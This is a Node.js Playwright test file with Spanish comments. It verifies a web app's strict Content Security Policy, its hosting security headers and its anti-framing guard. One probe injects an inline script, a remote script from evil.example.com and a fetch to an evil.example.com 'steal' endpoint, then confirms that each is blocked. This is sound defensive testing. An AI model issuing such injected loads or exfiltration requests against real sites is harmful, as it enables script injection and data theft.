/* Política de seguridad del contenido (CSP) y antimarcos. Se comprueba que
   (1) la política de index.html es estricta y la cabecera de firebase.json dice lo mismo, (2) no hay scripts, estilos ni manejadores
   en línea, ni sitios externos en el código, (3) la app se usa entera sin ninguna infracción, (4) la política bloquea lo ajeno,
   (5) la app no se deja mostrar dentro de otra página (cabeceras y guard.js).  Uso: node tests/csp.js */
const { chromium } = require('playwright');
const fs = require('fs'), path = require('path');
const { crear, APP, RAIZ } = require('../tools/servidor.js'), { fakeGoogle } = require('./fake-firebase/google.js');
let fails = 0; const ok = (c, m) => { if (!c) fails++; console.log((c ? '  ✓ ' : '  ✗ ') + m); };
const walk = d => fs.readdirSync(d, { withFileTypes: true }).flatMap(e => e.isDirectory() ? walk(path.join(d, e.name)) : [path.join(d, e.name)]);
const rel = f => path.relative(APP, f).split(path.sep).join('/');

(async () => {
  console.log('1. Lo que declaran index.html y firebase.json');
  const html = fs.readFileSync(path.join(APP, 'index.html'), 'utf8');
  const m = html.match(/<meta http-equiv="Content-Security-Policy" content="([^"]+)"/);
  ok(!!m, 'hay una política de seguridad del contenido');
  const pol = {}; (m ? m[1] : '').split(';').map(x => x.trim()).filter(Boolean).forEach(x => { const [k, ...v] = x.split(/\s+/); pol[k] = v; });
  const solo = k => (pol[k] || []).join(' ');
  ok(solo('default-src') === "'none'", "por defecto no se permite nada (default-src 'none')");
  /* App Check (GUIA-FIREBASE.md, paso 16) es la ÚNICA excepción a «nada de otros sitios»: si hay clave de sitio en firebase-config.js,
     la política admite reCAPTCHA; si no la hay, queda estricta. Las dos formas exactas las define tools/appcheck.js. */
  const AC = require('../tools/appcheck.js'), conAC = AC.hayClave();
  ok(m[1] === AC.politica(conAC), conAC ? 'App Check activado: la política admite reCAPTCHA y nada más' : 'App Check apagado (sin clave de sitio): la política es la estricta');
  ok(AC.politica(false).includes("script-src 'self';") && !/recaptcha|frame-src/.test(AC.politica(false)), 'estricta: scripts solo de la propia app, sin marcos');
  const extras = AC.politica(true).split(/[;\s]+/).filter(x => /^https:/.test(x) && !AC.politica(false).includes(x));
  ok(extras.length > 0 && extras.every(x => AC.RECAPTCHA.concat(AC.MARCOS, AC.APPCHECK).includes(x)) && extras.every(x => /^https:\/\/(www\.google\.com\/recaptcha\/|www\.gstatic\.com\/recaptcha\/|recaptcha\.google\.com\/recaptcha\/|content-firebaseappcheck\.googleapis\.com)$/.test(x)), 'con App Check solo se suman reCAPTCHA (por carpeta, no todo Google) y el servicio de App Check');
  ok(solo('style-src') === "'self'" && solo('font-src') === "'self'", 'estilos y tipografías: solo los de la propia app');
  ok(!m[1].includes('unsafe') && !m[1].includes('*'), "la política no usa 'unsafe-…' ni comodines");
  ok(solo('object-src') === "'none'" && solo('base-uri') === "'self'" && solo('form-action') === "'self'" && (conAC || !pol['frame-src']), 'sin plugins; base y formularios solo hacia el propio sitio' + (conAC ? '' : '; sin marcos'));
  const fj = JSON.parse(fs.readFileSync(path.join(RAIZ, 'firebase.json'), 'utf8')), hs = {};
  fj.hosting.headers.find(h => h.source === '**').headers.forEach(h => { hs[h.key] = h.value; });
  ok(hs['Content-Security-Policy'] === m[1] + "; frame-ancestors 'none'", "la cabecera de Hosting es la misma política más frame-ancestors 'none'");
  ok(hs['X-Frame-Options'] === 'DENY' && hs['X-Content-Type-Options'] === 'nosniff' && /strict-origin/.test(hs['Referrer-Policy']) && /camera=\(\)/.test(hs['Permissions-Policy']), 'cabeceras: antimarcos, nosniff, referrer y permisos');
  ok(hs['Cross-Origin-Opener-Policy'] === 'same-origin' && hs['Cross-Origin-Resource-Policy'] === 'same-origin', 'cabeceras: ninguna otra página puede abrir la app con acceso a ella ni usar sus archivos (Fase 8)');
  ok(fj.hosting.public === 'APP' && fj.firestore.rules === 'firestore.rules', 'Hosting publica solo la carpeta APP');
  ok(!/<script(?![^>]*\ssrc=)[^>]*>/i.test(html) && !/<style/i.test(html), 'index.html no tiene scripts ni estilos en línea');
  ok(!/\son[a-z]+\s*=/i.test(html) && !/\sstyle\s*=/i.test(html), 'index.html no tiene manejadores (onclick=…) ni atributos style');
  ok(!/https?:\/\//.test(html.replace(m[0], '')), 'index.html no carga nada de otros sitios');
  const code = walk(APP).filter(f => /\.(js|css)$/.test(f) && !rel(f).startsWith('vendor/'));
  const bad = code.filter(f => /\son(click|change|input|submit|load|error)=["']|\beval\(|new Function\(|\sstyle=["']|document\.write|insertAdjacentHTML\(|<script/.test(fs.readFileSync(f, 'utf8'))).map(rel);
  ok(bad.length === 0, 'el código no genera manejadores ni estilos en línea, ni usa eval' + (bad.length ? ': ' + bad.join(', ') : ''));
  /* Además del ingreso, solo dos ENLACES (no cargas): la Política de Privacidad y las Condiciones de Google, que el aviso de reCAPTCHA
     debe nombrar (pantallas/privacidad.js). Se abren aparte, en el navegador. */
  const PERMITIDOS = ['https://accounts.google.com/o/oauth2/v2/auth', 'https://policies.google.com/privacy', 'https://policies.google.com/terms'];
  const ENLACES = PERMITIDOS.slice(1);
  /* El formato Excel (.xlsx) exige NOMBRAR sus esquemas (espacios de nombres XML); no son direcciones que se carguen (connect-src lo impediría).
     Se admiten solo en core/xlsx.js y solo esos tres. */
  const ESQUEMAS = ['http://schemas.openxmlformats.org/spreadsheetml/2006/main', 'http://schemas.openxmlformats.org/officeDocument/2006/relationships', 'http://schemas.openxmlformats.org/package/2006/'];
  const sinComentarios = t => t.replace(/\/\*[\s\S]*?\*\//g, '').replace(/^\s*\/\/.*$/gm, '');
  const ext = code.flatMap(f => (sinComentarios(fs.readFileSync(f, 'utf8')).match(/https?:\/\/[^\s'"`)]+/g) || []).filter(u => !PERMITIDOS.includes(u) && !(rel(f) === 'js/core/xlsx.js' && ESQUEMAS.includes(u))).map(u => rel(f) + ' → ' + u));
  ok(ext.length === 0, 'los únicos sitios externos nombrados en el código son el ingreso de Google y los enlaces a sus políticas (más los nombres de esquema del formato Excel)' + (ext.length ? ': ' + ext.join(', ') : ''));
  const usos = code.flatMap(f => { const t = sinComentarios(fs.readFileSync(f, 'utf8')); return ENLACES.filter(u => t.includes(u)).map(u => ({ f: rel(f), u, t })); });
  ok(usos.length > 0 && usos.every(x => x.f === 'js/pantallas/privacidad.js') && usos.every(x => !x.t.split(/[;\n]/).some(linea => linea.includes(x.u) && /(src|fetch|import)\W/.test(linea.slice(0, linea.indexOf(x.u))))), 'las políticas de Google solo se nombran como enlaces, en el aviso de privacidad');
  const css = fs.readFileSync(path.join(APP, 'css', 'tokens.css'), 'utf8');
  ok(['Barlow-Regular', 'Barlow-Medium', 'Barlow-SemiBold', 'BarlowCondensed-Medium', 'BarlowCondensed-SemiBold', 'BarlowCondensed-Bold'].every(n => fs.existsSync(path.join(APP, 'fonts', n + '.woff')) && css.includes('fonts/' + n + '.woff')) && fs.existsSync(path.join(APP, 'fonts', 'OFL-Barlow.txt')), 'las seis tipografías están en la app, declaradas, y con su licencia');
  ok(/'\.\/guard\.js'/.test(fs.readFileSync(path.join(APP, 'sw.js'), 'utf8')) && html.indexOf('guard.js') < html.indexOf('js/app.js'), 'guard.js se carga primero y está en la caché sin conexión');

  console.log('2. La app corre sin infracciones y la política bloquea lo ajeno');
  const srv = crear({ fake: true, sinCabeceras: true }), URL = await srv.abrir();   // sin cabeceras: aquí manda solo la política de index.html
  const br = await chromium.launch(), errors = [];
  const ctx = await br.newContext({ viewport: { width: 390, height: 780 }, serviceWorkers: 'block' });
  await ctx.addInitScript(() => { window.__viol = []; document.addEventListener('securitypolicyviolation', e => window.__viol.push(e.violatedDirective + ' ' + e.blockedURI)); });
  const page = await ctx.newPage(); page.on('pageerror', e => errors.push(e.message));
  await fakeGoogle(page);
  await page.goto(URL); await page.waitForSelector('#btnGoogle');
  const v0 = await page.evaluate(() => window.__viol.slice());
  await page.click('#btnGoogle'); await page.waitForSelector('#appRoot:not([hidden])');
  await page.waitForSelector('#toast:not([hidden])');
  for (const t of ['mas', 'inicio', 'mas']) { await page.click('#nav button[data-tab="' + t + '"]'); await page.waitForTimeout(120); }
  await page.click('[data-act="diag"]'); await page.waitForSelector('#dlg[open]'); await page.click('[data-act="cerrar-hoja"]');
  await page.click('#irAccesos'); await page.waitForSelector('#secSolicitudes'); await page.click('.volver'); await page.waitForSelector('#irAccesos');
  await page.click('[data-act="upd-check"]'); await page.waitForTimeout(300);
  await page.click('[data-act="salir"]'); await page.waitForSelector('dialog.cfm[open]'); await page.click('dialog.cfm [data-r="0"]');
  const viol = v0.concat(await page.evaluate(() => window.__viol));
  ok(viol.length === 0, 'ingresar y recorrer la app entera no produce ninguna infracción' + (viol.length ? ' (' + viol.join(' | ') + ')' : ''));
  ok((await page.evaluate(() => getComputedStyle(document.documentElement).getPropertyValue('--barh').trim())) !== '', 'los ajustes de tamaño por código funcionan con la política estricta');
  const probe = await page.evaluate(async () => {
    const out = {}; window.__viol.length = 0;
    const s = document.createElement('script'); s.textContent = 'window.__inline = 1'; document.head.appendChild(s);
    const e = document.createElement('script'); e.src = 'https://evil.example.com/x.js'; document.head.appendChild(e);
    const st = document.createElement('style'); st.textContent = 'body{outline:9px solid red}'; document.head.appendChild(st);
    const d = document.createElement('div'); d.innerHTML = '<p id="pin" style="outline: 7px solid red">x</p>'; document.body.appendChild(d);
    try { await fetch('https://evil.example.com/steal', { mode: 'no-cors' }); out.fetch = 'pasó'; } catch (x) { out.fetch = 'bloqueado'; }
    const i = document.createElement('img'); i.src = 'https://evil.example.com/p.png'; document.body.appendChild(i);
    const f = document.createElement('iframe'); f.src = 'https://evil.example.com/'; document.body.appendChild(f);
    await new Promise(r => setTimeout(r, 300));
    out.inline = window.__inline === 1; out.viol = window.__viol.slice();
    out.estilo = getComputedStyle(document.body).outlineWidth === '9px' || getComputedStyle(document.getElementById('pin')).outlineWidth === '7px';
    return out;
  });
  ok(!probe.inline, 'un script en línea inyectado no se ejecuta');
  ok(!probe.estilo, 'un estilo en línea inyectado no se aplica');
  ok(probe.fetch === 'bloqueado', 'una conexión a otro sitio queda bloqueada');
  ok(probe.viol.some(v => /^script-src/.test(v) && /evil/.test(v)) && probe.viol.some(v => /^img-src/.test(v)) && probe.viol.some(v => /^(frame-src|child-src|default-src)/.test(v)), 'un script, una imagen y un marco de otro sitio quedan bloqueados');
  ok(errors.length === 0, 'sin errores de JavaScript' + (errors.length ? ': ' + errors.slice(0, 2).join(' | ') : ''));
  srv.close();

  console.log('3. No se deja mostrar dentro de otra página');
  const marco = (q, r) => { r.writeHead(200, { 'Content-Type': 'text/html' }); r.end('<iframe id="f" src="/" width="400" height="600"></iframe>'); };
  for (const [nombre, o] of [['con las cabeceras de Hosting', { fake: true, rutas: { '/framer': marco } }], ['sin cabeceras (solo guard.js)', { fake: true, sinCabeceras: true, rutas: { '/framer': marco } }]]) {
    const s2 = crear(o), U2 = await s2.abrir(), p2 = await ctx.newPage();
    await p2.goto(U2 + 'framer'); await p2.waitForTimeout(800);
    const fr = p2.frames().find(f => f !== p2.mainFrame());
    const visible = fr && p2.url() === U2 + 'framer' && await fr.evaluate(() => !!document.getElementById('gate') && getComputedStyle(document.documentElement).display !== 'none').catch(() => false);
    ok(!visible, nombre + ': dentro de un marco ajeno la app no se muestra');
    await p2.close(); s2.close();
  }
  await br.close();
  console.log(fails ? '\nFALLAS: ' + fails : '\nTodo bien'); process.exit(fails ? 1 : 0);
})().catch(e => { console.error(e); process.exit(1); });
